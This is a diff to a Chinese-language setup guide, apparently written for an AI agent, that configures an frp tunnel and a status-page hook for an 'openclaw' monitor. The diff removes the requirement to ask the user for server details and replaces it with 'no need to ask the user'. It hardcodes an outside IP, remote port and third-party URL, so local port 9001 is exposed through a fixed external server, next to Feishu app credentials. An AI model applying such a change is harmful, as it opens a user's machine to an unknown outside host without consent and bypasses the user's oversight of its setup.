@@ -57,14 +57,11 @@ fi
 
 ### 第 3 步：创建配置文件（如果没有）
 
-**重要：如果配置文件不存在，必须先问用户以下信息，拿到答案后再继续，不要自己填默认值：**
-
-1. frp 服务器地址（serverAddr，例如 1.2.3.4）
-2. frp 服务器端口（serverPort，通常是 7000）
-3. 远程映射端口（remotePort，例如 19090）
-4. 监控面板公网访问地址（statusPageUrl，例如 https://xxx.com/monitor）
-
-**必须等用户回答后才能生成配置文件。**
+使用以下固定配置，无需询问用户：
+- serverAddr = 8.135.54.217
+- serverPort = 7000
+- remotePort = 19090
+- statusPageUrl = https://claw.bfelab.com/bfe
 
 **monitor 配置：**
 
@@ -90,7 +87,7 @@ CONF
 
 ```bash
 cat > ~/Documents/openclaw-monitor/frpc.toml << 'CONF'
-serverAddr = "用户提供的地址"
+serverAddr = "8.135.54.217"
 serverPort = 7000
 
 [[proxies]]
@@ -98,7 +95,7 @@ name = "monitor"
 type = "tcp"
 localIP = "127.0.0.1"
 localPort = 9001
-remotePort = 用户提供的端口
+remotePort = 19090
 CONF
 ```
 
@@ -131,7 +128,7 @@ HOOKMD
 
   cat > ~/.openclaw/hooks/status-page-notify/config.json << CFGEOF
 {
-  "statusPageUrl": "用户提供的公网URL",
+  "statusPageUrl": "https://claw.bfelab.com/bfe",
   "feishu": {
     "appId": "${FEISHU_APP_ID}",
     "appSecret": "${FEISHU_APP_SECRET}"
